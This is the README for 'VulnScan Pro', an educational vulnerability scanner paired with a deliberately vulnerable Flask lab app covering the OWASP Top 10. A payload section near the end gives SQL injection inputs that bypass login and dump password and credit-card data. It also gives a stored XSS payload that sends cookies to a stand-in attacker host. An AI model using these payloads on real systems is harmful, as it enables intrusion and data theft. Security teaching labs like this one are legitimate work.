<div align="center">

# 🛡️ VulnScan Pro

**Automated web vulnerability scanner + interactive exploit lab — OWASP Top 10** VISIT PROOF PDF FOR SCREENSHOTS

[![Python](https://img.shields.io/badge/Python-3.11-blue?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Flask](https://img.shields.io/badge/Flask-3.0.3-black?style=for-the-badge&logo=flask)](https://flask.palletsprojects.com)
[![React](https://img.shields.io/badge/React-18-61dafb?style=for-the-badge&logo=react&logoColor=black)](https://react.dev)
[![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?style=for-the-badge&logo=docker&logoColor=white)](https://docs.docker.com/compose/)
[![OWASP](https://img.shields.io/badge/OWASP-Top%2010-red?style=for-the-badge)](https://owasp.org/Top10/)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

> ⚠️ **For educational and authorized security testing only.**  
> Never run VulnApp on a public or production server.

**Built by Divy(https://github.com/divy1212ctrl)**

</div>

---

## FOR Screenshots VISIT THE PROOF PDF

**Dashboard — 14 findings, CVSS max 9.8, Critical Risk Score 100**

![Dashboard Overview](screenshots/dashboard.png)

**Findings Table — all 14 vulnerabilities, severity-sorted with CVSS bars**

![Findings Table](screenshots/findings-table.png)

![Findings Table cont.](screenshots/findings-table-2.png)

**Live Scan Log — real-time terminal output inside the dashboard**

![Scan Log](screenshots/scan-log-complete.png)

---

## What is this?

VulnScan Pro has four components that work together:

| Component | What it does | Port |
|-----------|-------------|------|
| **VulnApp** (`vulnapp.py`) | Deliberately vulnerable Flask app — the attack target | 5000 |
| **Scanner** (`main.py` + modules) | Python CLI that auto-detects vulnerabilities + generates reports | 8000 |
| **Dashboard** (`Dashboard.jsx`) | React frontend — live charts, findings table, scan terminal | 3000 |
| **Crypto Demo** (`crypto_demo.py`) | Standalone MD5 cracker, Caesar breaker, JWT forger | — |

---

## Project Structure

```
VulnScan-Pro/
│
├── docker-compose.yml              ← Start everything: docker-compose up --build
│
├── vulnapp/                        ← Service 1: Attack target (port 5000)
│   ├── vulnapp.py                  ← Deliberately vulnerable Flask app
│   ├── requirements.txt            ← flask==3.0.3, PyJWT==2.8.0
│   └── Dockerfile                  ← python:3.11-slim
│
├── scanner/                        ← Service 2: Scanner + API (port 8000)
│   ├── main.py                     ← CLI entry point — orchestrates all modules
│   ├── sqli_scanner.py             ← SQLi detection: error-based, blind, UNION
│   ├── xss_scanner.py              ← XSS fuzzer: reflected + stored
│   ├── header_analyzer.py          ← Security header checker (9 headers)
│   ├── report_generator.py         ← HTML + PDF report builder
│   ├── api_server.py               ← REST API served to dashboard
│   ├── requirements.txt            ← flask, flask-cors, requests, reportlab, etc.
│   └── Dockerfile                  ← python:3.11-slim, CMD: api_server.py
│
├── dashboard/                      ← Service 3: React UI (port 3000)
│   ├── src/
│   │   ├── main.jsx                ← React entry point
│   │   └── Dashboard.jsx           ← Full dashboard: charts, table, scan log
│   ├── index.html                  ← Vite HTML entry
│   ├── vite.config.js              ← Vite + /api proxy → port 8000
│   ├── package.json                ← react@18, recharts, vite
│   ├── nginx.conf                  ← Serves React + proxies /api to scanner
│   └── Dockerfile                  ← Multi-stage: node:20 build → nginx:alpine
│
├── crypto-demo/                    ← Service 4: Crypto attacks demo
│   ├── crypto_demo.py              ← Hash cracker + Caesar breaker + JWT forger
│   ├── requirements.txt            ← requests, reportlab, beautifulsoup4
│   └── Dockerfile                  ← python:3.11-slim, CMD: crypto_demo.py
│
├── screenshots/                    ← Proof screenshots (in this README) VISIT PROOF PROJECT PDF
│   ├── dashboard.png
│   ├── findings-table.png
│   ├── findings-table-2.png
│   └── scan-log-complete.png
│
└── reports/                        ← Auto-created on first scan
    ├── report.html
    ├── report.pdf
    └── results.json
```

---

## Complete File Inventory

**Python (8 files):**

| File | Location | Purpose |
|------|----------|---------|
| `vulnapp.py` | `vulnapp/` | Vulnerable Flask target — all attack endpoints |
| `main.py` | `scanner/` | CLI orchestrator — runs all scan modules |
| `sqli_scanner.py` | `scanner/` | 3-technique SQLi detector |
| `xss_scanner.py` | `scanner/` | Reflected + Stored XSS fuzzer |
| `header_analyzer.py` | `scanner/` | 9-header security checker |
| `report_generator.py` | `scanner/` | HTML + PDF output |
| `api_server.py` | `scanner/` | Flask REST API for dashboard |
| `crypto_demo.py` | `crypto-demo/` | Hash cracker, Caesar breaker, JWT forger |

**React (2 files):**

| File | Location | Purpose |
|------|----------|---------|
| `Dashboard.jsx` | `dashboard/src/` | Full dashboard component |
| `main.jsx` | `dashboard/src/` | React DOM entry point |

**Config (8 files):**

| File | Location | Purpose |
|------|----------|---------|
| `docker-compose.yml` | root | Defines all 4 services + network + volume |
| `Dockerfile` | `dashboard/` | Multi-stage node build → nginx |
| `Dockerfile` | `vulnapp/` | python:3.11-slim for vulnapp |
| `Dockerfile` | `scanner/` | python:3.11-slim for scanner API |
| `Dockerfile` | `crypto-demo/` | python:3.11-slim for crypto demo |
| `nginx.conf` | `dashboard/` | React Router + /api proxy |
| `vite.config.js` | `dashboard/` | Dev server + /api proxy |
| `package.json` | `dashboard/` | react@18, recharts@2, vite@5 |
| `index.html` | `dashboard/` | Vite HTML entry |

**Requirements (3 separate files):**

| File | Used by | Packages |
|------|---------|---------|
| `vulnapp/requirements.txt` | VulnApp | `flask==3.0.3`, `PyJWT==2.8.0` |
| `scanner/requirements.txt` | Scanner + API | `flask`, `flask-cors`, `requests`, `beautifulsoup4`, `reportlab`, `PyJWT`, `bcrypt` |
| `crypto-demo/requirements.txt` | Crypto Demo | `requests`, `reportlab`, `beautifulsoup4` |

---

## Vulnerabilities Covered

| OWASP ID | Vulnerability | VulnApp Endpoint | Scanner Module |
|----------|--------------|-----------------|----------------|
| A03 | SQLi — Classic login bypass | `POST /api/login` | `sqli_scanner.py` |
| A03 | SQLi — UNION based data dump | `GET /api/products/search?q=` | `sqli_scanner.py` |
| A03 | SQLi — Boolean Blind | `GET /api/user/exists?username=` | `sqli_scanner.py` |
| A03 | XSS — Reflected | `GET /api/xss/reflect?name=` | `xss_scanner.py` |
| A03 | XSS — Stored | `POST /api/xss/comment` | `xss_scanner.py` |
| A01 | IDOR — Broken Access Control | `GET /api/orders/<id>` | `main.py` |
| A02 | Crypto Failures — MD5, weak JWT | `vulnapp.py`, `crypto_demo.py` | `main.py` |
| A07 | JWT Role Tampering | `GET /api/jwt/forge` + `/api/jwt/admin` | `main.py` |
| A01 | CSRF — No token validation | `POST /api/csrf/transfer` | `main.py` |
| A05 | Missing Security Headers | All routes | `header_analyzer.py` |

**Scanner found 14 real findings on VulnApp: 6 Critical · 5 High · 2 Medium · 1 Low**

---

## Quickstart — Docker

```bash
git clone https://github.com/divy1212ctrl/vulnscan-pro.git
cd vulnscan-pro

docker-compose up --build
```

| Service | URL |
|---------|-----|
| VulnApp (target) | http://localhost:5000 |
| Scanner API | http://localhost:8000/api/health |
| Dashboard | http://localhost:3000 |
| Crypto Demo | runs in container logs |

Docker Compose starts services in correct order — scanner waits for VulnApp `/api/health` to return 200 before starting.

---

## Manual Setup (No Docker)

### VulnApp
```bash
cd vulnapp
pip install -r requirements.txt
python vulnapp.py
```

### Scanner
```bash
cd scanner
pip install -r requirements.txt

python main.py --target http://localhost:5000              # HTML report
python main.py --target http://localhost:5000 --format both  # HTML + PDF
python main.py --target http://localhost:5000 --serve        # + start API server
```

### Dashboard
```bash
cd dashboard
npm install
npm run dev   # http://localhost:3000
```

### Crypto Demo
```bash
cd crypto-demo
pip install -r requirements.txt
python crypto_demo.py
```

---

## Seeded Users in VulnApp

| Username | Password | Role | MD5 (stored in DB) |
|----------|----------|------|---------------------|
| admin | admin | admin | `21232f297a57a5a743894a0e4a801fc3` |
| alice | password1234 | user | `6384e2b2184bcbf58eccf10ca7a6563c` |
| bob | 1234 | user | `81dc9bdb52d04dc20036dbd8313ed055` |

Passwords stored as **unsalted MD5** — intentionally weak for the hash cracking demo in `crypto_demo.py`.

---

## Scanner CLI Reference

```bash
python main.py --target <URL> [--format html|pdf|both] [--out <dir>] [--serve]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--target` / `-t` | required | Base URL of target |
| `--format` / `-f` | `html` | `html`, `pdf`, or `both` |
| `--out` / `-o` | `reports/` | Output directory |
| `--serve` / `-s` | off | Auto-start `api_server.py` on port 8000 after scan |

---

## API Server Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/health` | GET | Status, timestamp, results availability |
| `/api/results` | GET | Latest findings + severity + by-type summary |
| `/api/results/history` | GET | All past scan JSON files |
| `/api/scan` | POST | Trigger new scan (NDJSON stream) |
| `/api/findings/export` | GET | Download results.json |

---

## VulnApp Endpoints Reference

| Route | Method | Vulnerability |
|-------|--------|--------------|
| `/api/login` | POST | SQLi Classic + Boolean Blind |
| `/api/products/search?q=` | GET | SQLi UNION Based |
| `/api/user/exists?username=` | GET | SQLi Boolean Blind |
| `/api/orders/<id>` | GET | IDOR |
| `/api/xss/reflect?name=` | GET | Reflected XSS |
| `/api/xss/comment` | POST | Stored XSS submit |
| `/api/xss/comments` | GET | Stored XSS view |
| `/api/jwt/forge?role=admin` | GET | Get forged admin JWT |
| `/api/jwt/admin` | GET | Accepts forged JWT |
| `/api/csrf/transfer` | POST | CSRF no token |
| `/api/secure/login` | POST | Secure comparison (parameterized) |
| `/api/health` | GET | Docker healthcheck |

---

## Attack Payloads Quick Reference

**Login Bypass**
```
POST /api/login
{"username": "admin'--", "password": "anything"}
```

**UNION Dump — dumps users table with passwords + credit cards**
```
GET /api/products/search?q=' UNION SELECT id,username,password,email,credit_card FROM users--
```

**Boolean Blind — extract hash one char at a time**
```
GET /api/user/exists?username=alice' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='2'--
```

**Stored XSS**
```json
POST /api/xss/comment
{"user": "x", "content": "<script>document.location='http://attacker.com/?c='+document.cookie</script>"}
```

**JWT Forge**
```bash
GET /api/jwt/forge?role=admin          # get forged token
GET /api/jwt/admin  -H "Authorization: Bearer <token>"   # server accepts it
# secret is 'weakjwtsecret' — hardcoded in docker-compose.yml
```

---

## ⚠️ Disclaimer

For **educational and authorized security research only**.

- ✅ Run only on `localhost` or an isolated lab environment
- ✅ Scan only systems you own or have explicit written permission to test
- ❌ Never deploy VulnApp on a public server
- ❌ Never use the scanner against unauthorized systems

Unauthorized use is illegal under the Information Technology Act, 2000 (India) and equivalent laws worldwide.

---

## Author

**Divya Prakash Bharti**



---

<div align="center">
MIT License · © 2024 Divya Prakash Bharti
</div>
